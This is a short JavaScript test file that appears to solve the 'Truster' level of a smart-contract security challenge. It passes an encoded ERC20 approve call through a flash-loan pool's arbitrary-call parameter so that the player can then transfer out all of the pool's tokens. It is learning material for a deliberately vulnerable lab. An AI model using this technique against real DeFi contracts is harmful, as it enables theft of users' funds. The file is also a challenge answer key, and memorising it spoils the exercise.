```js
// test/truster/truster.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        let abi = ["function approve(address to, uint256 amount)"];

        let iface = new ethers.utils.Interface(abi);

        const data = iface.encodeFunctionData("approve", [
        player.address,
        TOKENS_IN_POOL,
        ]);

        // we will aprove 'TOKENS_IN_POOL' tokens to 'player.address' after this call
        await pool.flashLoan(0, player.address, token.address, data);
        
        // transfer tokens from pool.address to player.address
        await token
        .connect(player)
        .transferFrom(pool.address, player.address, TOKENS_IN_POOL);

    });
```
